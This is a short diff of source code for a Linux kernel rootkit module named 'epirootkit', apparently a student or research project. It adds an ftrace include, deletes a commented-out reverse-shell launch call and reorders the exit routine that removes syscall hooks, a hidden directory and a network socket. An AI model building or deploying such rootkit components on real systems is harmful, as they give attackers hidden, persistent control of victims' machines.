@@ -4,6 +4,7 @@
 #include <linux/module.h>
 #include <linux/uaccess.h>
 
+#include "ftrace.h"
 #include "epirootkit.h"
 
 struct task_struct *network_thread = NULL;
@@ -55,8 +56,6 @@ static int __init epirootkit_init(void) {
         return -FAILURE;
     }
 
-    // launch_reverse_shell();
-
     // Start a kernel thread that will handle network communication
     thread_exited = false;
     network_thread = kthread_run(network_worker, NULL, "netcom_thread");
@@ -90,15 +89,15 @@ static void __exit epirootkit_exit(void) {
         DBG_MSG("epirootkit: close_thread: thread stopped\n");
     }
 
-    close_socket();
-
-    // Remove hooks from the syscall table
-    fh_remove_hooks(hooks, hook_array_size);
-
     // Remove the hidden directory
     if (remove_hidden_tmp_dir() != SUCCESS) {
         ERR_MSG("epirootkit: epirootkit_exit: failed to remove hidden tmp dir\n");
     }
+
+    close_socket();
+
+    // Remove hooks from the syscall table
+    fh_remove_hooks(hooks, hook_array_size);
 
     DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
 }
